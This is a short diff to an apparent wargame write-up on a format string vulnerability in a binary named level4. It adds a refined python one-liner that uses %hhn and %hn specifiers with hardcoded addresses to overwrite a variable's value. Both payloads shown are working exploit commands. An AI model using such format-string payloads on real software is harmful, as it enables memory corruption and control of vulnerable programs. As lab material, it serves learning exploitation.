@@ -21,3 +21,7 @@ The goal is to change the value of the m variable thanks to string format vulner
 We will use the %n identifier to write to the stack and to the adress pointed by %n
 
 python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250x%12$hn%21570x%13$hn"' | ./level4
+
+And better :
+
+python -c 'print "\x10\x98\x04\x08\x11\x98\x04\x08\x12\x98\x04\x08%56x%12$hhn%17x%13$hhn%173x%14$hn"' | ./level4
